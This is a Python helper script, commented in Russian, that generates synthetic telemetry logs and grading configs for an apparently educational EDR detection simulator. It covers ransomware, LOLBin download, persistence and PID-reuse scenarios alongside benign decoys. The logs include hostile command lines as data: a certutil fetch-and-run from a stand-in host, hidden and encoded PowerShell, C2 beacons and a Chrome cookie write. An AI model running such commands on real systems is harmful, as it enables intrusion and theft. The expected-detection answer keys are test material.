# -*- coding: utf-8 -*-
"""Как были получены открытые сценарии. Вспомогательный скрипт, не часть сборки.

Источник истины — сами файлы .log и .cfg в каталоге scenarios. Они простой
текст и правятся руками; ни симулятору, ни студенту Python не нужен.

Скрипт здесь потому, что два сценария повторяются: у ransomware сорок пар
«запись + переименование», у clean_build сорок единиц трансляции. Набирать
и выравнивать такое руками смысла нет, а править по одному полю во всех
сорока блоках — тем более.

Осторожно: если журнал правили руками, скрипт про эту правку не знает и при
следующем запуске её затрёт. Правило простое — либо мелкая правка прямо
в .log, либо правка здесь и полная перегенерация, но не то и другое сразу.
"""
import io, os

# Каталог scenarios — родительский для того, где лежит сам скрипт.
OUT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def write(name, text):
    io.open(os.path.join(OUT, name), "w", encoding="utf-8", newline="\n").write(text)
    n = sum(1 for l in text.splitlines() if l and not l.startswith(("#", ";")))
    print("%-26s %4d significant lines" % (name, n))


def q(value):
    """Значение в кавычках: в путях бывают пробелы («Start Menu»)."""
    return '"%s"' % value


def ev(ts, type_, pid, **kw):
    parts = ["ts=%d" % ts, "type=%s" % type_, "pid=%d" % pid]
    for k, v in kw.items():
        v = str(v)
        parts.append('%s="%s"' % (k, v) if (" " in v or "\t" in v) else "%s=%s" % (k, v))
    return " ".join(parts)


MAX = "C:\\Users\\max"
TEMP = MAX + "\\AppData\\Local\\Temp"
ROAM = MAX + "\\AppData\\Roaming"
SYS = "C:\\Windows\\System32"
PWSH = SYS + "\\WindowsPowerShell\\v1.0\\powershell.exe"

BASE_WORLD = (
    'process = pid=4    ppid=0 image="System" start=0 protected=1\n'
    'process = pid=880  ppid=4 image="C:\\Windows\\explorer.exe"'
    ' start=1729999000000 user=DESKTOP\\max\n'
)

CLEAN_EXPECT = """max_detections   = 0
must_not_detect  = rule=office_spawns_script_host
must_not_detect  = rule=mass_file_rename
must_not_detect  = rule=lolbin_download_exec
must_not_detect  = rule=startup_persistence
must_not_detect  = rule=unusual_path_exec
must_not_detect  = rule=script_host_beacon
max_unsafe_kills = 0
"""

# ------------------------------------------------------------------ ransomware

B = 1730100000000
DOCS = [
    "quarterly.xlsx", "contract.docx", "budget.xlsx", "notes.docx", "plan.pptx",
    "invoice_11.pdf", "invoice_12.pdf", "photo_01.jpg", "photo_02.jpg", "photo_03.jpg",
    "backup.zip", "salary.xlsx", "report_final.docx", "readme.txt", "scan_001.pdf",
    "scan_002.pdf", "audit.docx", "audit_2025.xlsx", "diagram.vsdx", "team.pptx",
    "prices.csv", "clients.csv", "keys.txt", "letter.docx", "letter_2.docx",
    "family_01.jpg", "family_02.jpg", "video.mp4", "thesis.docx", "thesis_v2.docx",
    "tax_2024.pdf", "tax_2025.pdf", "cv.docx", "cover.docx", "roadmap.pptx",
    "metrics.xlsx", "notes_old.txt", "archive.7z", "logo.png", "draft.docx",
]
assert len(DOCS) == 40

lines = [
    "# ransomware: процесс из Temp за шесть секунд перезаписывает и переименовывает",
    "# сорок документов пользователя, дописывая расширение .locked. По ходу дела",
    "# кладёт записку о выкупе и стучит наружу.",
    "#",
    "# Парный сценарий — clean_build: сборка делает столько же переименований",
    "# за то же время и обязана не срабатывать. Отличать надо не по количеству.",
    ev(B, "process_start", 2210, ppid=880, image=TEMP + "\\svchost.exe",
       cmdline="svchost.exe -e -q", user="DESKTOP\\max"),
    ev(B + 400, "net_connect", 2210, raddr="45.9.7.11", rport=443, domain="pay.example"),
]
t = B + 1000
for i, doc in enumerate(DOCS):
    src = MAX + "\\Documents\\" + doc
    lines.append(ev(t, "file_write", 2210, path=src, size=4096 + i * 97))
    lines.append(ev(t + 60, "file_move", 2210, **{"from": src, "to": src + ".locked"}))
    if i == 19:
        note = MAX + "\\Documents\\README_RESTORE.txt"
        lines.append(ev(t + 90, "file_create", 2210, path=note))
        lines.append(ev(t + 110, "file_write", 2210, path=note, size=1417))
    t += 150
desk = MAX + "\\Desktop\\README_RESTORE.txt"
lines += [
    ev(t + 200, "file_create", 2210, path=desk),
    ev(t + 260, "file_write", 2210, path=desk, size=1417),
    ev(t + 800, "net_connect", 2210, raddr="45.9.7.11", rport=443, domain="pay.example"),
]
write("ransomware.log", "\n".join(lines) + "\n")

world_files = "".join(
    'file    = path="%s\\Documents\\%s" size=%d created=1729000000000 modified=1729500000000\n'
    % (MAX, doc, 8192 + i * 311) for i, doc in enumerate(DOCS))

write("ransomware.cfg", """; Шифровальщик. Сценарий занятия 3.1 (пороговое правило) и 3.3 (реагирование:
; процесс живой, его надо остановить, а тело — изолировать).

[sim]
events   = ransomware.log
delivery = inline
speed    = instant
self_pid = 4242
seed     = 1
report   = ransomware.report.txt

[edr]
out = ransomware.detections.txt

[world]
""" + BASE_WORLD
+ 'file    = path="' + TEMP + '\\svchost.exe" size=204800'
  ' created=1730099000000 modified=1730099000000\n'
+ world_files + """
[agent]
quarantine_dir = C:\\quarantine
telemetry      = detections_only

[expect]
detection      = rule=mass_file_rename pid=2210
must_kill      = pid=2210
must_not_kill  = pid=880
must_not_kill  = pid=4
must_move      = from=""" + q(TEMP + "\\svchost.exe") + """
max_unsafe_kills = 0
max_os_queries   = 4000
max_detections   = 4
""")

# -------------------------------------------------------------- lolbin_download

B = 1730200000000
UPD = TEMP + "\\upd.exe"
CHROME_COOKIES = MAX + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"

lines = [
    "# lolbin_download: штатная системная утилита тянет из сети файл, который",
    "# тут же запускается. Ни одна программа в цепочке не является вредоносной",
    "# сама по себе — вредоносна связка.",
    ev(B, "process_start", 3310, ppid=880, image=SYS + "\\cmd.exe",
       cmdline="cmd /c certutil -urlcache -split -f"
               " http://cdn.example.net/upd.txt %TEMP%\\upd.exe",
       user="DESKTOP\\max"),
    ev(B + 500, "process_start", 3315, ppid=3310, image=SYS + "\\certutil.exe",
       cmdline="certutil -urlcache -split -f http://cdn.example.net/upd.txt " + UPD),
    ev(B + 900, "net_connect", 3315, raddr="91.204.11.7", rport=80, domain="cdn.example.net"),
    ev(B + 1500, "file_create", 3315, path=UPD),
    ev(B + 1900, "file_write", 3315, path=UPD, size=126976),
    ev(B + 2200, "process_end", 3315, exit=0),
    ev(B + 2600, "process_start", 3340, ppid=3310, image=UPD, cmdline="upd.exe --install"),
    ev(B + 3100, "net_connect", 3340, raddr="45.9.7.11", rport=443, domain="c2.example"),
    ev(B + 3600, "file_create", 3340, path=ROAM + "\\Upd\\state.bin"),
    ev(B + 3900, "file_write", 3340, path=ROAM + "\\Upd\\state.bin", size=8192),
    ev(B + 4300, "process_end", 3310, exit=0),
    ev(B + 5000, "net_connect", 3340, raddr="45.9.7.11", rport=8443, domain="c2.example"),
    ev(B + 5800, "file_write", 1300, path=CHROME_COOKIES, size=131072),
]
write("lolbin_download.log", "\n".join(lines) + "\n")

write("lolbin_download.cfg", """; Загрузка через системную утилиту и запуск загруженного. Сценарий занятия 3.1:
; правило из двух шагов со связкой «путь записи попал в командную строку».

[sim]
events   = lolbin_download.log
delivery = inline
speed    = instant
self_pid = 4242
seed     = 1
report   = lolbin_download.report.txt

[edr]
out = lolbin_download.detections.txt

[world]
""" + BASE_WORLD
+ 'process = pid=1300 ppid=880 image="C:\\Program Files\\Google\\Chrome\\Application'
  '\\chrome.exe" start=1729999500000 user=DESKTOP\\max\n' + """
[agent]
quarantine_dir = C:\\quarantine
telemetry      = detections_only

[expect]
detection      = rule=lolbin_download_exec pid=3340
must_kill      = pid=3340
must_not_kill  = pid=1300
must_not_kill  = pid=880
must_move      = from=""" + q(UPD) + """
max_unsafe_kills = 0
max_os_queries   = 200
max_detections   = 4
""")

# ----------------------------------------------------------------- persistence

B = 1730300000000
SYNC = ROAM + "\\Sync\\sync.exe"
LNK = ROAM + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Sync.lnk"

lines = [
    "# persistence: тело кладётся в профиль пользователя, ярлык на него — в папку",
    "# автозапуска, а затем оно запускается оттуда. Два разных признака: запись",
    "# в автозапуск и запуск из необычного пути.",
    "#",
    "# Реестра в os.h нет и не будет: автозапуск здесь — это путь в Startup.",
    "# Заводить целую подсистему ради одного признака смысла нет.",
    ev(B, "process_start", 4410, ppid=880, image=PWSH,
       cmdline="powershell -w hidden -c Copy-Item $env:TEMP\\s.bin"
               " $env:APPDATA\\Sync\\sync.exe",
       user="DESKTOP\\max"),
    ev(B + 600, "file_create", 4410, path=SYNC),
    ev(B + 1000, "file_write", 4410, path=SYNC, size=98304),
    ev(B + 1600, "file_create", 4410, path=LNK),
    ev(B + 1900, "file_write", 4410, path=LNK, size=1246),
    ev(B + 2400, "process_end", 4410, exit=0),
    ev(B + 3000, "process_start", 4455, ppid=880, image=SYNC, cmdline="sync.exe --service",
       user="DESKTOP\\max"),
    ev(B + 3600, "net_connect", 4455, raddr="45.9.7.11", rport=443, domain="c2.example"),
    ev(B + 4400, "file_create", 4455, path=ROAM + "\\Sync\\queue.dat"),
    ev(B + 5200, "net_connect", 4455, raddr="45.9.7.11", rport=443, domain="c2.example"),
]
write("persistence.log", "\n".join(lines) + "\n")

write("persistence.cfg", """; Закрепление в системе. Здесь важен разрыв во времени: к моменту сработки
; процесс, который писал в автозапуск, уже мёртв, и попытка его завершить даст
; OS_NO_SUCH_PROCESS. Это не сбой агента, а штатный исход — материал занятия 3.3.

[sim]
events   = persistence.log
delivery = inline
speed    = instant
self_pid = 4242
seed     = 1
report   = persistence.report.txt

[edr]
out = persistence.detections.txt

[world]
""" + BASE_WORLD
+ 'file    = path="' + TEMP + '\\s.bin" size=98304'
  ' created=1730299000000 modified=1730299000000\n' + """
[agent]
quarantine_dir = C:\\quarantine
telemetry      = detections_only

[expect]
detection      = rule=startup_persistence pid=4410
detection      = rule=unusual_path_exec pid=4455
must_kill      = pid=4455
must_not_kill  = pid=880
must_delete    = path=""" + q(LNK) + """
max_unsafe_kills = 0
max_os_queries   = 200
max_detections   = 6
""")

# ------------------------------------------------------------------- pid_reuse

B = 1730400000000
lines = [
    "# pid_reuse: скриптовый хост запускает дочерний процесс и завершается сам.",
    "# Освободившийся номер 1042 достаётся безобидному notepad.exe, и только",
    "# после этого набирается достаточно улик, чтобы сработало правило.",
    "#",
    "# Агент, который реагирует на цепочку предков по одному номеру процесса,",
    "# завершит notepad. Правильный помнит, что личность процесса — это пара",
    "# (pid, start_time), и передаёт expected_start_time в os_process_kill:",
    "# симулятор ответит OS_PID_REUSED, а пользователь не потеряет заметки.",
    ev(B, "process_start", 1042, ppid=880, image=SYS + "\\wscript.exe",
       cmdline="wscript.exe " + TEMP + "\\b.js", user="DESKTOP\\max"),
    ev(B + 600, "process_start", 1180, ppid=1042, image=PWSH,
       cmdline="powershell -w hidden -enc SQBFAFgA", user="DESKTOP\\max"),
    ev(B + 1100, "net_connect", 1042, raddr="45.9.7.11", rport=443, domain="c2.example"),
    ev(B + 1800, "process_end", 1042, exit=0),
    ev(B + 2000, "process_start", 1042, ppid=880, image=SYS + "\\notepad.exe",
       cmdline="notepad.exe " + MAX + "\\notes.txt", user="DESKTOP\\max"),
    ev(B + 2500, "net_connect", 1180, raddr="45.9.7.11", rport=443, domain="c2.example"),
    ev(B + 3000, "file_create", 1180, path=TEMP + "\\stage2.bin"),
    ev(B + 3300, "file_write", 1180, path=TEMP + "\\stage2.bin", size=48128),
    ev(B + 3600, "net_connect", 1180, raddr="45.9.7.11", rport=8443, domain="c2.example"),
    ev(B + 4200, "file_write", 1042, path=MAX + "\\notes.txt", size=1240),
    ev(B + 4900, "file_write", 1042, path=MAX + "\\notes.txt", size=1502),
]
write("pid_reuse.log", "\n".join(lines) + "\n")

write("pid_reuse.cfg", """; Переиспользование номера процесса. Основной сценарий занятия 3.3.
;
; Проверка тонкая: завершить 1180 обязательно, завершить 1042 нельзя, и при этом
; max_unsafe_kills = 0 требует, чтобы агент вообще передавал expected_start_time.
; Агент, который просто не тронул 1042, пройдёт первые два условия и провалит
; третье, если хоть где-то позвал os_process_kill с нулём.

[sim]
events   = pid_reuse.log
delivery = inline
speed    = instant
self_pid = 4242
seed     = 1
report   = pid_reuse.report.txt

[edr]
out = pid_reuse.detections.txt

[world]
""" + BASE_WORLD
+ 'file    = path="' + TEMP + '\\b.js" size=812'
  ' created=1730399000000 modified=1730399000000\n'
+ 'file    = path="' + MAX + '\\notes.txt" size=1024'
  ' created=1729000000000 modified=1730000000000\n' + """
[agent]
quarantine_dir = C:\\quarantine
telemetry      = detections_only

[expect]
detection      = rule=script_host_beacon pid=1180
must_kill      = pid=1180
must_not_kill  = pid=1042
must_not_kill  = pid=880
max_unsafe_kills = 0
max_os_queries   = 200
max_detections   = 4
""")

# ---------------------------------------------------------------- clean_office

B = 1730500000000
CACHE = MAX + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache"
ASD = ROAM + "\\Microsoft\\Word\\AutoRecovery save of report.asd"

lines = [
    "# clean_office: обычный рабочий день. Атаки нет ни одной, и детектов быть",
    "# не должно ни одного.",
    "#",
    "# Приманки расставлены намеренно: explorer запускает cmd, пользователь",
    "# двойным щелчком запускает корпоративный .vbs, chrome массово пишет кэш,",
    "# документ один раз переименовывается. Правило «любой wscript.exe — атака»",
    "# поймает две атаки из пяти и вдобавок провалится здесь.",
    ev(B, "file_write", 1500, path=MAX + "\\report.docx", size=21504),
]
for i in range(8):
    lines.append(ev(B + 400 + i * 350, "file_write", 1500, path=ASD, size=20480 + i * 512))
t = B + 3400
for i in range(10):
    blob = "%s\\data_%d" % (CACHE, i)
    lines.append(ev(t + i * 120, "file_create", 1300, path=blob))
    lines.append(ev(t + i * 120 + 40, "file_write", 1300, path=blob, size=65536 + i * 1024))
t = B + 5000
lines += [
    ev(t, "process_start", 1820, ppid=880, image=SYS + "\\cmd.exe",
       cmdline="cmd /c dir C:\\work", user="DESKTOP\\max"),
    ev(t + 700, "process_end", 1820, exit=0),
    ev(t + 1400, "process_start", 1850, ppid=880, image=SYS + "\\wscript.exe",
       cmdline="wscript.exe C:\\corp\\tools\\map_drives.vbs", user="DESKTOP\\max"),
    ev(t + 1900, "net_connect", 1850, raddr="10.20.0.7", rport=445, domain="fs01.corp.local"),
    ev(t + 2600, "process_end", 1850, exit=0),
    ev(t + 3200, "file_create", 1600, path=MAX + "\\Documents\\~$quarterly.xlsx"),
    ev(t + 3600, "file_write", 1600, path=MAX + "\\Documents\\quarterly.xlsx", size=41984),
    ev(t + 4000, "file_delete", 1600, path=MAX + "\\Documents\\~$quarterly.xlsx"),
    ev(t + 4800, "file_move", 880,
       **{"from": MAX + "\\report.docx", "to": MAX + "\\report_final.docx"}),
    ev(t + 5500, "file_write", 1700,
       path=MAX + "\\AppData\\Local\\Microsoft\\Outlook\\max.ost", size=2097152),
    ev(t + 6300, "process_start", 1880, ppid=880, image=SYS + "\\notepad.exe",
       cmdline="notepad.exe " + MAX + "\\notes.txt", user="DESKTOP\\max"),
    ev(t + 7000, "file_write", 1880, path=MAX + "\\notes.txt", size=1400),
]
write("clean_office.log", "\n".join(lines) + "\n")

OFFICE = "C:\\Program Files\\Microsoft Office\\root\\Office16"
write("clean_office.cfg", """; Чистый сценарий. Считается не полнота, а точность: любой детект здесь —
; ложное срабатывание, и с ним придётся идти к пользователю объясняться.

[sim]
events   = clean_office.log
delivery = inline
speed    = instant
self_pid = 4242
seed     = 1
report   = clean_office.report.txt

[edr]
out = clean_office.detections.txt

[world]
""" + BASE_WORLD
+ 'process = pid=1300 ppid=880 image="C:\\Program Files\\Google\\Chrome\\Application'
  '\\chrome.exe" start=1729999500000 user=DESKTOP\\max\n'
+ 'process = pid=1500 ppid=880 image="' + OFFICE + '\\winword.exe"'
  ' start=1729999600000 user=DESKTOP\\max cmdline="winword.exe /n ' + MAX + '\\report.docx"\n'
+ 'process = pid=1600 ppid=880 image="' + OFFICE + '\\excel.exe"'
  ' start=1729999700000 user=DESKTOP\\max\n'
+ 'process = pid=1700 ppid=880 image="' + OFFICE + '\\outlook.exe"'
  ' start=1729999800000 user=DESKTOP\\max\n'
+ 'file    = path="' + MAX + '\\report.docx" size=20480'
  ' created=1729998000000 modified=1729999000000\n'
+ 'file    = path="' + MAX + '\\notes.txt" size=1024'
  ' created=1729000000000 modified=1730000000000\n'
+ 'file    = path="' + MAX + '\\Documents\\quarterly.xlsx" size=40960'
  ' created=1729000000000 modified=1729000000000\n' + """
[agent]
quarantine_dir = C:\\quarantine
telemetry      = detections_only

[expect]
""" + CLEAN_EXPECT + "max_os_queries   = 400\n")

# ----------------------------------------------------------------- clean_build

B = 1730600000000
UNITS = [
    "api", "actions", "config", "delivery", "event_log", "kv_parse", "report", "sim",
    "world", "sink", "status", "main", "engine", "rules", "model", "planner",
    "loader", "source", "queue", "clock", "format", "hash", "log", "util",
    "detect", "window", "threshold", "sequence", "match", "lambda", "tree",
    "chain", "filter", "sink_file", "sink_edr", "sink_console", "args", "paths",
    "bench", "stress",
]
assert len(UNITS) == 40

BUILD = "C:\\work\\nano-edr\\build"
MSVC = ("C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools"
        "\\MSVC\\14.44\\bin\\Hostx64\\x64")

lines = [
    "# clean_build: сборка проекта. Сорок объектных файлов за шесть секунд,",
    "# каждый пишется во временное имя и переименовывается — ровно тот профиль",
    "# по объёму и темпу, что у сценария ransomware.",
    "#",
    "# Это намеренная ловушка. Правило «сорок переименований за шесть секунд —",
    "# шифровальщик» ловит атаку и обязано промолчать здесь. Отличать надо не",
    "# по количеству: у сборки источник и цель лежат в каталоге сборки, набор",
    "# расширений закрытый (.tmp -> .obj), а родитель — известный инструмент.",
    ev(B, "process_start", 5510, ppid=2500, image="C:\\Program Files\\CMake\\bin\\cmake.exe",
       cmdline="cmake --build build -j8", user="DESKTOP\\max"),
    ev(B + 300, "process_start", 5520, ppid=5510, image="C:\\Program Files\\Ninja\\ninja.exe",
       cmdline="ninja -C build"),
]
t = B + 800
pid = 5600
for i, unit in enumerate(UNITS):
    tmp = "%s\\obj\\%s.obj.tmp" % (BUILD, unit)
    obj = "%s\\obj\\%s.obj" % (BUILD, unit)
    lines += [
        ev(t, "process_start", pid, ppid=5520, image=MSVC + "\\cl.exe",
           cmdline="cl.exe /c /std:c++latest src\\%s.cpp /Fo%s" % (unit, tmp)),
        ev(t + 40, "file_create", pid, path=tmp),
        ev(t + 80, "file_write", pid, path=tmp, size=40960 + i * 1024),
        ev(t + 110, "file_move", pid, **{"from": tmp, "to": obj}),
        ev(t + 130, "process_end", pid, exit=0),
    ]
    t += 150
    pid += 1
exe = BUILD + "\\nano-edr.exe"
lines += [
    ev(t + 200, "process_start", 5990, ppid=5520, image=MSVC + "\\link.exe",
       cmdline="link.exe /out:build\\nano-edr.exe build\\obj\\*.obj"),
    ev(t + 400, "file_create", 5990, path=exe + ".tmp"),
    ev(t + 700, "file_write", 5990, path=exe + ".tmp", size=1048576),
    ev(t + 800, "file_move", 5990, **{"from": exe + ".tmp", "to": exe}),
    ev(t + 900, "process_end", 5990, exit=0),
    ev(t + 1200, "process_end", 5520, exit=0),
    ev(t + 1400, "process_end", 5510, exit=0),
    ev(t + 2000, "process_start", 6100, ppid=2500, image=exe,
       cmdline="nano-edr.exe --selftest", user="DESKTOP\\max"),
    ev(t + 2800, "process_end", 6100, exit=0),
]
write("clean_build.log", "\n".join(lines) + "\n")

write("clean_build.cfg", """; Чистый сценарий, он же ловушка для порогового правила из занятия 3.1.
;
; Последнее событие — запуск только что собранного nano-edr.exe из каталога
; сборки. Правило «запуск из необычного пути» тоже обязано здесь промолчать.

[sim]
events   = clean_build.log
delivery = inline
speed    = instant
self_pid = 4242
seed     = 1
report   = clean_build.report.txt

[edr]
out = clean_build.detections.txt

[world]
""" + BASE_WORLD
+ 'process = pid=2500 ppid=880 image="' + MAX + '\\AppData\\Local\\Programs'
  '\\Microsoft VS Code\\Code.exe" start=1729999900000 user=DESKTOP\\max\n' + """
[agent]
quarantine_dir = C:\\quarantine
telemetry      = detections_only

[expect]
""" + CLEAN_EXPECT + "max_os_queries   = 4000\n")
